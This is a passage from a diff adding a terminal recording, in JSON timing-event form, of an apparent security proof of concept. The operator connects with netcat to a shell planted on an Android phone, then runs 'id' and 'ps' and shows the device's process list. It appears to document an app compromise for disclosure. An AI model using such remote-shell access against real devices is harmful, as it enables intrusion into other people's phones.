+      0.000050,
+      "\r\r\n"
+    ],
+    [
+      0.001840,
+      "\u001b]2;nc 10.174.90.159 6666\u0007\u001b]1;nc\u0007"
+    ],
+    [
+      1.482930,
+      "i"
+    ],
+    [
+      0.078384,
+      "d"
+    ],
+    [
+      0.224941,
+      "\r\n"
+    ],
+    [
+      0.288188,
+      "uid=10149(u0_a149) gid=10149(u0_a149) groups=1015(sdcard_rw),1028(sdcard_r),3003(inet),50149(all_a149) context=u:r:untrusted_app:s0\r\n"
+    ],
+    [
+      0.926349,
+      "p"
+    ],
+    [
+      0.124176,
+      "s"
+    ],
+    [
+      0.472264,
+      "\r\n"
+    ],
+    [
+      0.369357,
+      "USER     PID   PPID  VSIZE  RSS     WCHAN    PC         NAME\r\nroot      1     0     680    540   ffffffff 00000000 S /init\r\nroot      2     0     0      0     ffffffff 00000000 S kthreadd\r\nroot      3     2     0      0     ffffffff 00000000 S ksoftirqd/0\r\nroot      7     2     0      0     ffffffff 00000000 D kworker/u:0H\r\nroot      8     2     0      0     ffffffff 00000000 S migration/0\r\nroot      13    2     0      0     ffffffff 00000000 S khelper\r\nroot      14    2     0      0     ffffffff 00000000 S netns\r\nroot      18    2     0      0     ffffffff 00000000 S modem_notifier\r\nroot      19    2     0      0     ffffffff 00000000 S smd_channel_clo\r\nroot      20    2     0      0     ffffffff 00000000 S smsm_cb_wq\r\nroot      22    2     0      0     ffffffff 00000000 S rpm-smd\r\nroot      23    2     0      0     ffffffff 00000000 S kworker/u:1H\r\nroot      24    2     0      0     ffffffff 00000000 S irq/317-earjack\r\nroot      25    2     0      0     ffffffff 00000000 S sync_supers\r\nroot      26    2    "
+    ],
+    [
+      0.000097,
+      " 0      0     ffffffff 00000000 S bdi-default\r\nroot      27    2     0      0     ffffffff 00000000 S kblockd\r\nroot      28    2     0      0     ffffffff 00000000 S vmalloc\r\nroot      29    2     0      0     ffffffff 00000000 S khubd\r\nroot      30    2     0      0     ffffffff 00000000 S irq/102-msm_iom\r\nroot      31    2     0      0     ffffffff 00000000 S irq/102-msm_iom\r\nroot      32    2     0      0     ffffffff 00000000 S irq/102-msm_iom\r\nroot      33    2     0      0     ffffffff 00000000 S irq/79-msm_iomm\r\nroot      34    2     0      0     ffffffff 00000000 S irq/78-msm_iomm\r\nroot      35    2     0      0     ffffffff 00000000 S irq/78-msm_iomm\r\nroot      36    2     0      0     ffffffff 00000000 S irq/74-msm_iomm\r\nroot      37    2     0      0     ffffffff 00000000 S irq/75-msm_iomm\r\nroot      38    2     0      0     ffffffff 00000000 S irq/75-msm_iomm\r\nroot      39    2     0      0     ffffffff 00000000 S irq/75-msm_iomm\r\nroot      40    2     0      0     ffffffff 00000000 S irq/75-msm_i"
+    ],
+    [
+      0.000322,
+      "omm\r\nroot      41    2     0      0     ffffffff 00000000 S irq/273-msm_iom\r\nroot      42    2     0      0     ffffffff 00000000 S irq/273-msm_iom\r\nroot      43    2     0      0     ffffffff 00000000 S irq/97-msm_iomm\r\nroot      44    2     0      0     ffffffff 00000000 S irq/97-msm_iomm\r\nroot      45    2     0      0     ffffffff 00000000 S irq/97-msm_iomm\r\nroot      46    2     0      0     ffffffff 00000000 S l2cap\r\nroot      47    2     0      0     ffffffff 00000000 S a2mp\r\nroot      48    2     0      0     ffffffff 00000000 S cfg80211\r\nroot      49    2     0      0     ffffffff 00000000 S qmi\r\nroot      50    2     0      0     ffffffff 00000000 S nmea\r\nroot      51    2     0      0     ffffffff 00000000 S msm_ipc_router\r\nroot      52    2     0      0     ffffffff 00000000 S apr_driver\r\nroot      54    2     0      0     ffffffff 00000000 S kswapd0\r\nroot      55    2     0      0     ffffffff 00000000 S fsnotify_mark\r\nroot      56    2     0      0     ffffffff 00000000 S cifsiod\r\nroot      57  "
+    ],
+    [
+      0.000326,
+      "  2     0      0     ffffffff 00000000 S crypto\r\nroot      75    2     0      0     ffffffff 00000000 S ad_calc_wq\r\nroot      76    2     0      0     ffffffff 00000000 S hdmi_tx_workq\r\nroot      77    2     0      0     ffffffff 00000000 S anx7808_work\r\nroot      78    2     0      0     ffffffff 00000000 S k_hsuart\r\nroot      79    2     0      0     ffffffff 00000000 S diag_wq\r\nroot      80    2     0      0     ffffffff 00000000 S diag_cntl_wq\r\nroot      81    2     0      0     ffffffff 00000000 S diag_dci_wq\r\nroot      82    2     0      0     ffffffff 00000000 S kgsl-3d0\r\nroot      84    2     0      0     ffffffff 00000000 S f9966000.spi\r\nroot      88    2     0      0     ffffffff 00000000 S usbnet\r\nroot      89    2     0      0     ffffffff 00000000 S irq/329-anx7808\r\nroot      90    2     0      0     ffffffff 00000000 S k_rmnet_mux_wor\r\nroot      91    2     0      0     ffffffff 00000000 S f_mtp\r\nroot      92    2     0      0     ffffffff 00000000 S file-storage\r\nroot      93    2     0      0 "
+    ],
+    [
+      0.000290,
+      "    ffffffff 00000000 S uether\r\nroot      94    2     0      "
+    ],
+    [
+      0.019466,
+      "0     ffffffff 00000000 S synaptics_wq\r\nroot      95    2     0      0     ffffffff 00000000 S irq/362-s3350\r\nroot      96    2     0      0     ffffffff 00000000 S msm_vidc_worker\r\nroot      97    2     0      0     ffffffff 00000000 S msm_vidc_worker\r\nroot      99    2     0      0     ffffffff 00000000 S msm_cpp_workque\r\nroot      100   2     0      0     ffffffff 00000000 S irq/350-bq51013\r\nroot      102   2     0      0     ffffffff 00000000 D dbs_sync/0\r\nroot      103   2     0      0     ffffffff 00000000 D dbs_sync/1\r\nroot      104   2     0      0     ffffffff 00000000 D dbs_sync/2\r\nroot      105   2     0      0     ffffffff 00000000 D dbs_sync/3\r\nroot      106   2     0      0     ffffffff 00000000 S cfinteractive\r\nroot      107   2     0      0     ffffffff 00000000 S irq/170-msm_sdc\r\nroot      108   2     0      0     ffffffff 00000000 S binder\r\nroot      109   2     0      0     ffffffff 00000000 S usb_bam_wq\r\nroot      110   2     0      0     ffffffff 00000000 S krfcommd\r\nroot      111   2    "
+    ],
+    [
+      0.000088,
+      " 0      0     ffffffff 00000000 S bam_dmux_rx\r\nroot      112   2     0      0     ffffffff 00000000 S bam_dmux_tx\r\nroot      113   2     0      0     ffffffff 00000000 S rq_stats\r\nroot      114   2     0      0     ffffffff 00000000 S deferwq\r\nroot      116   2     0      0     ffffffff 00000000 S irq/361-MAX1704\r\nroot      118   2     0      0     ffffffff 00000000 S mmcqd/1\r\nroot      119   2     0      0     ffffffff 00000000 S mmcqd/1rpmb\r\nroot      120   2     0      0     ffffffff 00000000 S wl_event_handle\r\nroot      121   2     0      0     ffffffff 00000000 S dhd_watchdog_th\r\nroot      122   2     0      0     ffffffff 00000000 S dhd_dpc\r\nroot      123   2     0      0     ffffffff 00000000 S dhd_rxf\r\nroot      124   2     0      0     ffffffff 00000000 S dhd_sysioc\r\nroot      125   2     0      0     ffffffff 00000000 S vibrator\r\nroot      126   2     0      0     ffffffff 00000000 S max1462x\r\nroot      127   2     0      0     ffffffff 00000000 S irq/310-maxim_m\r\nroot      128   2     0      0     "
+    ],
+    [
+      0.000273,
+      "ffffffff 00000000 S irq/311-maxim_m\r\nroot      129   1     612    340   ffffffff 00000000 S /sbin/ueventd\r\nroot      131   2     0      0     ffffffff 00000000 S jbd2/mmcblk0p25\r\nroot      132   2     0      0     ffffffff 00000000 S ext4-dio-unwrit\r\nroot      137   2     0      0     ffffffff 00000000 S jbd2/mmcblk0p28\r\nroot      138   2     0      0     ffffffff 00000000 S ext4-dio-unwrit\r\nroot      142   2     0      0     ffffffff 00000000 S jbd2/mmcblk0p27\r\nroot      143   2     0      0     ffffffff 00000000 S ext4-dio-unwrit\r\nroot      144   2     0      0     ffffffff 00000000 S jbd2/mmcblk0p16\r\nroot      145   2     0      0     ffffffff 00000000 S ext4-dio-unwrit\r\nroot      170   2     0      0     ffffffff 00000000 S IPCRTR\r\nroot      171   2     0      0     ffffffff 00000000 S ipc_rtr_q6_ipcr\r\nroot      172   2     0      0     ffffffff 00000000 S sb-1\r\nroot      174   2     0      0     ffffffff 00000000 S ngd_msm_ctrl_ng\r\nroot      175   1     1428   4     ffffffff 00000000 S /sbin/healthd\r\nsys"
+    ],
+    [
+      0.000192,
+      "tem    176   1     1004   348   ffffffff 00000000 S /system/bin/servicemanager\r\nroot      177   1     4668   876   ffffffff 00000000 S /system/bin/vold\r\nnobody    178   1     6756   564   ffffffff 00000000 S /system/bin/rmt_storage\r\nroot      180   1     1072   620   ffffffff 00000000 S /system/bin/debuggerd\r\nradio     181   1     22924  3764  ffffffff 00000000 S /system/bin/rild\r\ndrm       184   1     14532  4512  ffffffff 00000000 S /system/bin/drmserver\r\ninstall   186   1     1040   532   ffffffff 00000000 S /system/bin/installd\r\nkeystore  188   1     3356   1296  ffffffff 00000000 S /system/bin/keystore\r\nradio     189   1     6464   508   ffffffff 00000000 S /system/bin/bridgemgrd\r\nradio     190   1     11664  704   ffffffff 00000000 S /system/bin/qmuxd\r\nradio     191   1     7752   832   ffffffff 00000000 S /system/bin/netmgrd\r\nnobody    192   1     72220  41576 ffffffff 00000000 S /system/bin/sensors.qcom\r\nroot      195   1     44604  1000  ffffffff 00000000 S /system/bin/thermal-engine-hh\r\nsystem    19"
+    ],
+    [
+      0.000175,
+      "6   1     2124   316   ffffffff 00000000 S /system/bin/qse"
+    ],
+    [
+      0.005227,
+      "ecomd\r\nmedia_rw  197   1     3560   436   ffffffff 00000000 S /system/bin/sdcard\r\ncamera    198   1     5560   2316  ffffffff 00000000 S /system/bin/mm-qcamera-daemon\r\nsystem    199   1     6432   676   ffffffff 00000000 S /system/bin/time_daemon\r\nshell     200   1     3564   212   ffffffff 00000000 S /sbin/adbd\r\nroot      206   1     1000   260   ffffffff 00000000 S daemonsu:mount:master\r\nroot      210   2     0      0     ffffffff 00000000 S msm_slim_qmi_cl\r\nroot      211   2     0      0     ffffffff 00000000 S msm_qmi_rtx_q\r\nsystem    214   196   4224   288   ffffffff 00000000 S /system/bin/qseecomd\r\nroot      216   2     0      0     ffffffff 00000000 S irq/288-wcd9xxx\r\nroot      344   1     4208   284   ffffffff 00000000 S daemonsu:master\r\nroot      413   1     9868   1088  ffffffff 00000000 S /system/bin/netd\r\nroot      414   1     866908 58324 ffffffff 00000000 S zygote\r\nmedia     417   1     39324  9560  ffffffff 00000000 S /system/bin/mediaserver\r\nroot      597   2     0      0     ffffffff 00000000"
+    ],
+    [
+      0.000088,
+      " S IPCRTR\r\nroot"
+    ],
+    [
+      0.000294,
+      "      600   2     0      0     ffffffff 00000000 S ipc_rtr_smd_ipc\r\nsystem    795   414   1027620 92424 ffffffff 00000000 S system_server\r\nu0_a12    869   414   978792 82200 ffffffff 00000000 S com.android.systemui\r\nwifi      942   1     3340   1952  ffffffff 00000000 S /system/bin/wpa_supplicant\r\nu0_a54    990   414   957712 57508 ffffffff 00000000 S com.google.android.inputmethod.latin\r\nu0_a7     1005  414   972412 70164 ffffffff 00000000 S com.google.android.gms.persistent\r\nradio     1039  414   907748 41964 ffffffff 00000000 S com.android.phone\r\nradio     1047  414   875944 33872 ffffffff 00000000 S com.redbend.vdmc\r\nnfc       1063  414   915648 40828 ffffffff 00000000 S com.android.nfc\r\nu0_a7     1099  414   963116 59204 ffffffff 00000000 S com.google.process.gapps\r\nu0_a7     1206  414   1122904 92656 ffffffff 00000000 S com.google.android.gms\r\nroot      1276  1     7216   492   ffffffff 00000000 S /system/bin/mpdecision\r\nu0_a7     1308  414   877124 33996 ffffffff 00000000 S com.google.process.location\r"
+    ],
+    [
+      0.000014,
+      "\r\nu0_a5     1353  414   886696 45208 ffffffff 00000000 S android.process.media\r\ndhcp      1449  1     1020   476   ffffffff 00000000 S /system/bin/dhcpcd\r\nroot      1589  344   3180   468   ffffffff 00000000 S daemonsu:10074\r\nradio     2043  414   876848 32476 ffffffff 00000000 S com.qualcomm.qcrilmsgtunnel\r\nu0_a77    2897  414   909752 42472 ffffffff 00000000 S com.lifeformlabs.vestige\r\nroot      3639  344   4092   416   ffffffff 00000000 S daemonsu:0\r\nroot      7789  344   5136   396   ffffffff 00000000 S daemonsu:10105\r\nroot      11348 2     0      0     ffffffff 00000000 S kworker/0:0H\r\nu0_a19    13221 414   1074260 92244 ffffffff 00000000 S com.google.android.googlequicksearchbox\r\nu0_a149   16582 1     2036   228   c08c7ce0 0000963c S /data/local/tmp/busybox\r\nsystem    18584 1     103676 18868 ffffffff 00000000 S /system/bin/surfaceflinger\r\nroot      18596"
+    ],
+    [
+      0.000991,
+      " 2     0      0     ffffffff 00000000 D mdss_fb0\r\nroot      18890 2     0      0     ffffffff 00000000 S kworker/u:2\r\nu0_a3     20104 414   879256 39276 ffffffff 00000000 S android.process.acore\r\nu0_a19    21576 414   953416 66872 ffffffff 00000000 S com.google.android.googlequicksearchbox:search\r\nroot      22347 2     0      0     ffffffff 00000000 S kworker/u:4\r\nroot      22400 2     0      0     ffffffff 00000000 S kworker/0:1H\r\nu0_a14    22488 414   921268 49192 ffffffff 00000000 S com.android.vending\r\nroot      25631 2     0      0     ffffffff 00000000 S kworker/u:0\r\nroot      25763 2     0      0     ffffffff 00000000 S flush-179:0\r\nroot      26604 2     0      0     ffffffff 00000000 S kworker/0:0\r\nroot      27969 2     0      0     ffffffff 00000000 S kworker/u:1\r\nroot      27970 2     0      0     ffffffff 00000000 S kworker/u:3\r\nroot      28112 2     0      0     ffffffff 00000000 S kworker/0:3H\r\nu0_a13    28241 414   874884 32780 ffffffff 00000000 S com.android.musicfx\r\nu0_a74    28270 414   88052"
+    ],
+    [
+      0.000093,
+      "8 35244 ffffff"
+    ],
+    [
+      0.000011,
+      "ff 00000000 S eu.chainfire.supersu\r\nu0_a4     28282 414   874932 33508 ffffffff 00000000 S com.android.defcontainer\r\nu0_a63    28296 414   903268 47472 ffffffff 00000000 S com.go"
+    ],
+    [
+      0.006565,
+      "ogle.android.apps.plus\r\nu0_a35    28378 414   981468 87928 ffffffff 00000000 S com.google.android.apps.docs\r\nu0_a65    28426 414   945228 39396 ffffffff 00000000 S com.quickoffice.android\r\nu0_a105   28446 414   875400 33548 ffffffff 00000000 S de.robv.android.xposed.installer\r\nu0_a34    28463 414   880700 35144 ffffffff 00000000 S com.android.documentsui\r\nroot      28517 2     0      0     ffffffff 00000000 S kworker/0:2\r\nu0_a11    28670 414   875080 33340 ffffffff 00000000 S com.google.android.partnersetup\r\nroot      28754 2     0      0     ffffffff 00000000 S kworker/u:5\r\nu0_a60    29496 414   911024 43192 ffffffff 00000000 S com.android.packageinstaller\r\nroot      29537 2     0      0     ffffffff 00000000 S kworker/u:6\r\nsystem    29555 414   874920 34132 ffffffff 00000000 S com.android.keychain\r\nu0_a156   29929 414   886912 42336 ffffffff 00000000 S com.baidu.browser.inter:common\r\nu0_a156   29962 414   889064 43128 ffffffff 00000000 S com.baidu.browser.inter:push\r\nu0_a156   29997 1     868    176   fffff"
+    ],
+    [
+      0.000094,
+      "fff 00000000 "
+    ],
+    [
+      0.000012,
+      "S b9cb707eee723ea0adbe38c425e9464d_procmo\r\nu0_a156   29999 414   894244 42328 ffffffff 00000000 S com.baidu.browser.inter:remote\r\nroot      30058 2     0      0     ffffffff 00000000 S kworker/0:2H\r\nu0_a149   30403 16582 916    324   c010aba4 40145110 S /system/bin/sh\r\nu0_a149   30443 30403 1240   240   00000000 401202c8 R ps\r\n"
+    ],
+    [
+      1.677795,
+      "^C"
+    ],
+    [
+      0.000537,
+      "\r\n"
+    ],
+    [
+      0.000098,
+      "\u001b[1m\u001b[7m%\u001b[27m\u001b[1m\u001b[0m                                                                                                          \r \r"
+    ],
+    [
+      0.000142,
+      "\u001b]2;rotlogix@carcass: ~/Tools/mitmproxy-0.15-osx\u0007"
+    ],
+    [
+      0.000038,
+      "\u001b]1;..roxy-0.15-osx\u0007"
+    ],
+    [
+      0.014167,
+      "\r\u001b[0m\u001b[27m\u001b[24m\u001b[J\u001b[31m┌[\u001b[01;37mrotlogix\u001b[00m\u001b[31m@\u001b[01;37mcarcass\u001b[00m\u001b[31m] [\u001b[01;37m/dev/ttys003\u001b[00m\u001b[31m] \u001b[31m[\u001b[01;37m130\u001b[00m\u001b[31m]\r\n\u001b[31m└[\u001b[01;37m~/Tools/mitmproxy-0.15-osx\u001b[00m\u001b[31m]\u003e\u001b[00m \u001b[K"
+    ],
+    [
+      0.000066,
+      "\u001b[?1h\u001b="
+    ],
+    [
+      0.817835,
+      "\r\r\n"
+    ]
+  ]
+}
